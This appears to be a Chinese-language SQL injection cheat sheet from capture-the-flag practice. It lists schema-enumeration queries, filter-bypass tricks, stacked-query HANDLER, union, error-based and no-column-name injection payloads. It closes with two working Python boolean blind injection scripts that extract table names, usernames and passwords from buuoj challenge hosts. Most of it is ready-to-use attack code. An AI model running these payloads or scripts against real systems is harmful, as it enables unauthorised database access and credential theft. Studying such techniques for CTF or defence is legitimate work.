# SQli

常规方法利用information\_schema

```sql
#爆库
select database()
#爆表
select group_concat(table_name) from information_schema.tables where table_schema=<database name>
#爆字段
select group_concat(column_name) from information_schema.columns where table_name=<table name>
#爆数据
select group_concat(<column name>) from <table name>
```

mysql &gt; 5.6 版本 利用sys库

```sql
# 爆表
# schema_auto_increment_columns

select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

# schema_table_statistics_with_buffer

select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
```

mysql &gt; 5.5 利用`innodb_table_stats`

```sql
# 爆表
select group_concat(table_name) from mysql.innodb_table_stats
```

## 技巧

* 加`()、/**/` bypass`空格`

* `like` bypass `=`

* `select .` bypass 一般是堆叠注入

  利用set

  利用handler

      1';handler `FlagHere` open;handler `FlagHere` read first;#

* 看回显点

  ```
  select 1,2,3,....
  ```

* 注释符

  * /\*\*/
  * \# -&gt; %23

  * -- 

* order by看字段数 先看看有几个回显点也可以用group by

  ```
  1' order by 3#
  ->

  1' order by 4#
  ->
  Error
  ```

* Union 联合注入

* limit

  ```
  limit i,n
  # tableName：表名
  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
  # n：为查询结果返回的数量
  # i与n之间使用英文逗号","隔开
  ```

* 报错注入

  * `updatexml(1,concat(1,(<SQLi>)),1)`
  * `extractvalue(1,concat(1,<SQli>))`

* 无列名注入  
  考虑这样的表格，使用select 1,2,3,4,5 union select \* from persons可以得到一张新的表格

  ```
  MariaDB [test]> select * from persons;
  +------+----------+-----------+--------------+--------+
  | ID   | LastName | FirstName | Address      | Credit |
  +------+----------+-----------+--------------+--------+
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    2 | Xill     | Hiler     | Like 10      | 100.67 |
  |    2 | Eki      | Hiler     | Nanfen 10    | 100.67 |
  +------+----------+-----------+--------------+--------+

  ->

  MariaDB [test]> select 1,2,3,4,5 union select * from persons;
  +------+-------+-------+--------------+--------+
  | 1    | 2     | 3     | 4            | 5      |
  +------+-------+-------+--------------+--------+
  |    1 | 2     | 3     | 4            |      5 |
  |    1 | Gates | Bill  | Xuanwumen 10 |   NULL |
  |    2 | Xill  | Hiler | Like 10      | 100.67 |
  |    2 | Eki   | Hiler | Nanfen 10    | 100.67 |
  +------+-------+-------+--------------+--------+
  ```

  然后就可以套娃拿数据了,注意`a`这个别名\(任意内容\)是必须的（新生成的表）

      MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a;          
      +-------+
      | 2     |
      +-------+
      | 2     |
      | Gates |
      | Xill  |
      | Eki   |
      +-------+

  或者也可以将数字换成别名 在反引号不可用的情况下

  ```
  MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a;
  +-------+
  | b     |
  +-------+
  | 2     |
  | Gates |
  | Xill  |
  | Eki   |
  +-------+
  ```

* 布尔盲注

  * 利用`if() ,like,or,>,=,<`

    ```python
    #coding=utf-8
    import requests
    import urllib

    url="http://6074ac45-6b22-49a0-ae5a-38c5940e1c1e.node3.buuoj.cn/image.php"
    #sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())" Result:admin,contents
    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')" Result:id,username,password,is_enqble
    #sql="select(group_concat(username))from(admin)" Result:a4341216,aebc38b6
    #sql="select(group_concat(password))from(admin)" Result:0c9bb00f,8a9b3d5a
    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')" Result:id,title,content,is_gnable
    #sql="select(group_concat(content))from(contents)"
    sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
    ret=''

    for i in range(1,50):
      l=1
      r=255
      while(l+1<r):
          mid=(l+r)/2
          payload="if((ascii(substr(("+sql+"),"+str(i)+",1)))>"+str(mid)+",1,0)"
          #print payload
          param={"id":payload}
          #print chr(mid)
          req=requests.get(url,params=param).text
          print req
          if (len(req)>10):
              l=mid
          else :
              r=mid
      ret=ret+chr(r)
      print "Result:"+ret
    ```

  * 利用0^1^0 并采取多线程
    ```python
    #coding=utf-8
    import requests
    import threading
    url="http://d23fcdc7-5653-43bc-802e-afeb7d6efea4.node3.buuoj.cn/search.php?id="

    #sql="select(group_concat(username))from(admin)" 
    #sql="select(group_concat(password))from(admin)"
    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
    #sql="select(group_concat(content))from(contents)"
    #sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
    #Result:F1naI1y,Flaaaaag
    sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
    #Result:id,username,password
    sql="select(group_concat(password))from(F1naI1y)"
    #sql="select(group_concat(password))from(users)"
    ret=''
    def booltest(start,end):
        ret=""
        for i in range(start,end):
            l=1
            r=255
            while(l+1<r):
                mid=(l+r)/2
                payload="0^((ascii(substr(({0}),{1},1)))>{2})^0".format(sql,i,mid)
                #payload="union select * from images where id=if(1>0,1,0)#"
                #print payload
                param = {
                    "id":payload,
                }
                #print chr(mid)
                req=requests.get(url,params=param)
                if (req.status_code != requests.codes.ok):
                    continue
                #print req.text
                if (len(req.text)>720):
                    l=mid
                else :
                    r=mid
            ret=ret+chr(r)
            print(threading.current_thread().name+"working:"+ret) 
        print(threading.current_thread().name+ret)
    


    thr3 = threading.Thread(target=booltest, args=(170, 219),name="3")


    thr3.start()
    ```



